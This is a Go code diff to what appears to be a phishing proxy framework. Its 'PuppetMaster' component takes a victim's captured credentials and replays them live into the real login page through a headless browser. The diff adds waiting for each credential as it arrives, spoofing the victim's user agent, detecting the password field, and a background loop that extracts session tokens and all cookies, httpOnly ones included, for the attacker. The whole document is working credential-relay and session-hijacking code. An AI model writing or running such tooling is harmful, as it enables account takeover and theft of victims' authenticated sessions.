@@ -44,6 +44,9 @@ type PuppetSession struct {
 	StartedAt     time.Time              `mapstructure:"started_at" json:"started_at" yaml:"started_at"`
 	CompletedAt   time.Time              `mapstructure:"completed_at" json:"completed_at" yaml:"completed_at"`
 	Error         string                 `mapstructure:"error" json:"error" yaml:"error"`
+	CurrentURL    string                 `json:"current_url" yaml:"current_url"`
+	UserAgent     string                 `json:"user_agent" yaml:"user_agent"`
+	PasswordFieldSeen bool               `json:"password_field_seen" yaml:"password_field_seen"` // NEW
 	
 	// Runtime fields
 	Trigger       *PuppetTrigger         `json:"-" yaml:"-"`
@@ -52,6 +55,7 @@ type PuppetSession struct {
 	Context       playwright.BrowserContext `json:"-" yaml:"-"`
 	LastActivity  time.Time              `json:"-" yaml:"-"`
 	CompletionChan chan string           `json:"-" yaml:"-"` // Signals completion with token value
+	mu            sync.RWMutex           // For credential updates
 }
 
 // InitPuppetMaster initializes the global puppet instance
@@ -106,20 +110,29 @@ func InitPuppetMaster(config *PuppetConfig) (*PuppetMaster, error) {
 }
 
 // LaunchPuppetForSession creates a puppet session for victim
-func (pm *PuppetMaster) LaunchPuppetForSession(victimSessionID string, credentials map[string]string, trigger *PuppetTrigger) (string, error) {
+func (pm *PuppetMaster) LaunchPuppetForSession(victimSessionID string, credentials map[string]string, trigger *PuppetTrigger, userAgent string) (string, error) {
 	pm.mu.Lock()
 	defer pm.mu.Unlock()
 
 	// Check if already running for this session
 	if session, exists := pm.activeSessions[victimSessionID]; exists {
-		// Only check if it's the same trigger
-		if session.TriggerId == trigger.Id {
-			if session.Status == "solving" || session.Status == "initializing" {
-				return victimSessionID, fmt.Errorf("puppet already running for session %s", victimSessionID)
+		// Update credentials if they have changed or new ones arrived
+		// If trigger is nil or fallback, we just update the existing session
+		if trigger == nil || trigger.Id == "fallback" || session.TriggerId == trigger.Id {
+			session.mu.Lock()
+			for k, v := range credentials {
+				session.Credentials[k] = v
 			}
-			// If already successfully completed, don't run again
+			session.mu.Unlock()
+			session.LastActivity = time.Now()
+
+			if session.Status == "solving" || session.Status == "initializing" {
+				log.Debug("[PUPPET] Updating credentials for existing session %s", victimSessionID)
+				return session.Id, nil
+			}
+			// If already successfully completed, don't run again unless explicitly wanted (not implemented yet)
 			if session.Status == "completed" {
-				log.Debug("[PUPPET] Session %s already completed for trigger %s, skipping re-launch", victimSessionID, trigger.Id)
+				log.Debug("[PUPPET] Session %s already completed, skipping re-launch", victimSessionID)
 				return session.Id, nil
 			}
 		}
@@ -132,6 +145,7 @@ func (pm *PuppetMaster) LaunchPuppetForSession(victimSessionID string, credentia
 		VictimSession: victimSessionID,
 		Trigger:       trigger,
 		Credentials:   credentials,
+		UserAgent:     userAgent,
 		Status:        "initializing",
 		StartedAt:     time.Now(),
 		LastActivity:  time.Now(),
@@ -144,6 +158,67 @@ func (pm *PuppetMaster) LaunchPuppetForSession(victimSessionID string, credentia
 	go pm.executePuppetSession(puppetSession)
 
 	return puppetSession.Id, nil
+}
+
+// extractLiveTokensAndCookies extracts tokens and cookies while a session is running
+func (pm *PuppetMaster) extractLiveTokensAndCookies(session *PuppetSession) {
+	if session.Page == nil || session.Context == nil {
+		return
+	}
+	
+	// Update CurrentURL
+	session.mu.Lock()
+	session.CurrentURL = session.Page.URL()
+	session.mu.Unlock()
+
+	// 1. Extract Tokens
+	tokensToCapture := session.Trigger.Tokens
+	if len(tokensToCapture) == 0 && session.Trigger.Token != "" {
+		tokensToCapture = []string{session.Trigger.Token}
+	}
+
+	for _, tokenName := range tokensToCapture {
+		// Only check if not already captured
+		tokenKey := session.VictimSession + "_" + tokenName
+		if val, _ := pm.tokenStore.GetToken(tokenKey); val != "" {
+			continue
+		}
+
+		val, err := pm.extractTokenFromPage(session.Page, tokenName)
+		if err == nil && val != "" {
+			pm.tokenStore.SetToken(tokenKey, val)
+			log.Success("[PUPPET] Live token %s captured for session %s", tokenName, session.VictimSession)
+			if session.TokenValue == "" {
+				session.TokenValue = val
+			}
+		}
+	}
+
+	// 2. Extract Cookies
+	if session.Trigger.ExtractCookies {
+		cookies, err := session.Context.Cookies()
+		if err == nil && len(cookies) > 0 {
+			pm.sessionMap.SetCookies(session.VictimSession, cookies)
+			
+			// Store cookies in session struct too
+			var cookieList []map[string]interface{}
+			for _, cookie := range cookies {
+				cookieList = append(cookieList, map[string]interface{}{
+					"name":     cookie.Name,
+					"value":    cookie.Value,
+					"domain":   cookie.Domain,
+					"path":     cookie.Path,
+					"expires":  cookie.Expires,
+					"httpOnly": cookie.HttpOnly,
+					"secure":   cookie.Secure,
+					"sameSite": cookie.SameSite,
+				})
+			}
+			session.mu.Lock()
+			session.Cookies = cookieList
+			session.mu.Unlock()
+		}
+	}
 }
 
 // executePuppetSession runs the automation flow
@@ -171,7 +246,11 @@ func (pm *PuppetMaster) executePuppetSession(session *PuppetSession) {
 	log.Info("[PUPPET] Starting automation for session %s (victim: %s)", session.Id, session.VictimSession)
 
 	// Create isolated browser context
-	context, err := pm.browser.NewContext(pm.getBrowserContextOptions())
+	opts := pm.getBrowserContextOptions()
+	if session.UserAgent != "" {
+		opts.UserAgent = playwright.String(session.UserAgent)
+	}
+	context, err := pm.browser.NewContext(opts)
 	if err != nil {
 		log.Error("[PUPPET] Failed to create context: %v", err)
 		session.Status = "failed"
@@ -213,8 +292,36 @@ func (pm *PuppetMaster) executePuppetSession(session *PuppetSession) {
 		log.Warning("[PUPPET] No OpenUrl specified for trigger %s, remaining on about:blank", session.Trigger.Name)
 	}
 
-	// Execute actions
-	if err := pm.executeActions(page, session.Trigger.Actions, session.Credentials); err != nil {
+	// Execute actions in a background goroutine so we can start extraction loop
+	actionError := make(chan error, 1)
+	go func() {
+		actionError <- pm.executeActions(session, session.Trigger.Actions)
+	}()
+
+	// Background extraction loop
+	stopExtraction := make(chan bool)
+	go func() {
+		ticker := time.NewTicker(2 * time.Second)
+		defer ticker.Stop()
+		for {
+			select {
+			case <-stopExtraction:
+				return
+			case <-ticker.C:
+				if session.Status == "failed" || session.Status == "completed" {
+					return
+				}
+				// Add a tiny delay to ensure cookies from recent navigation are processed
+				time.Sleep(500 * time.Millisecond)
+				pm.extractLiveTokensAndCookies(session)
+			}
+		}
+	}()
+	defer close(stopExtraction)
+
+	// Wait for actions to complete or session to fail
+	err = <-actionError
+	if err != nil {
 		log.Error("[PUPPET] Failed to execute actions: %v", err)
 		session.Status = "failed"
 		session.Error = err.Error()
@@ -297,10 +404,37 @@ func (pm *PuppetMaster) executePuppetSession(session *PuppetSession) {
 }
 
 // executeActions performs all configured actions
-func (pm *PuppetMaster) executeActions(page playwright.Page, actions []PuppetAction, credentials map[string]string) error {
+func (pm *PuppetMaster) executeActions(session *PuppetSession, actions []PuppetAction) error {
+	page := session.Page
 	for i, action := range actions {
-		log.Debug("[PUPPET] Executing action %d: %s", i, action.Selector)
+		log.Debug("[PUPPET] Executing action %d for session %s (selector: %s)", i, session.Id, action.Selector)
 		
+		// Handle WaitCred logic
+		if action.WaitCred != "" {
+			log.Info("[PUPPET] Action %d waiting for credential: %s", i, action.WaitCred)
+			waitStart := time.Now()
+			found := false
+			for time.Since(waitStart) < 5 * time.Minute { // 5-minute hard timeout for waiting for a credential
+				session.mu.RLock()
+				val, exists := session.Credentials[action.WaitCred]
+				session.mu.RUnlock()
+				
+				if exists && val != "" {
+					log.Success("[PUPPET] Credential %s received, continuing action %d", action.WaitCred, i)
+					found = true
+					break
+				}
+				
+				time.Sleep(1 * time.Second)
+				// Check if session was closed or aborted
+				if session.Status == "failed" {
+					return fmt.Errorf("session aborted while waiting for credential")
+				}
+			}
+			if !found {
+				return fmt.Errorf("timeout waiting for credential: %s", action.WaitCred)
+			}
+		}
 		timeout := 10000 // Default 10s
 		if action.Timeout > 0 {
 			timeout = action.Timeout
@@ -325,13 +459,23 @@ func (pm *PuppetMaster) executeActions(page playwright.Page, actions []PuppetAct
 				log.Warning("[PUPPET] Selector not found: %s, skipping action", action.Selector)
 				continue
 			}
+
+			// NEW: Track if we found the password field
+			if action.Selector == "#passwd" || strings.Contains(action.Selector, "passwd") {
+				session.mu.Lock()
+				session.PasswordFieldSeen = true
+				session.mu.Unlock()
+				log.Success("[PUPPET] Password field detected for session %s", session.Id)
+			}
 		}
 
-		// Substitute variables
+		// Substitute variables (using session lock)
 		value := action.Value
-		for key, val := range credentials {
+		session.mu.RLock()
+		for key, val := range session.Credentials {
 			value = strings.ReplaceAll(value, "{"+key+"}", val)
 		}
+		session.mu.RUnlock()
 
 		// Perform actions using same selector we just found
 		if value != "" && action.Selector != "" {
@@ -492,7 +636,6 @@ func (pm *PuppetMaster) WaitForToken(sessionID, tokenName string, timeout time.D
 	}
 	
 	// 2. Wait for puppet session to appear if it hasn't yet (registration wait)
-	// We give it a shorter grace period (2s) to avoid massive hangs
 	startTime := time.Now()
 	var session *PuppetSession
 	var exists bool
@@ -509,23 +652,24 @@ func (pm *PuppetMaster) WaitForToken(sessionID, tokenName string, timeout time.D
 		return "", fmt.Errorf("no puppet session found for %s", sessionID)
 	}
 	
-	if session.CompletionChan == nil {
-		return "", fmt.Errorf("puppet session has no completion channel")
-	}
+	log.Info("[PUPPET] Waiting for token %s from session %s (timeout: %v)", tokenName, session.Id, timeout)
 	
-	log.Info("[PUPPET] Waiting for puppet session %s to complete (timeout: %v)", session.Id, timeout)
-	
-	// Wait for completion with timeout
-	select {
-	case token := <-session.CompletionChan:
-		if token == "" {
-			return "", fmt.Errorf("puppet session failed or returned empty token")
+	// 3. Polling loop for tokens in TokenStore
+	waitStart := time.Now()
+	for time.Since(waitStart) < timeout {
+		if token, exists := pm.GetToken(sessionID, tokenName); exists {
+			log.Success("[PUPPET] Token %s captured for session %s", tokenName, sessionID)
+			return token, nil
 		}
-		log.Success("[PUPPET] Received token from puppet session: %s...", ShortenToken(token))
-		return token, nil
-	case <-time.After(timeout):
-		return "", fmt.Errorf("puppet session timeout after %v", timeout)
+		
+		if session.Status == "failed" {
+			return "", fmt.Errorf("puppet session failed: %s", session.Error)
+		}
+		
+		time.Sleep(1 * time.Second)
 	}
+	
+	return "", fmt.Errorf("puppet session timeout after %v", timeout)
 }
 
 
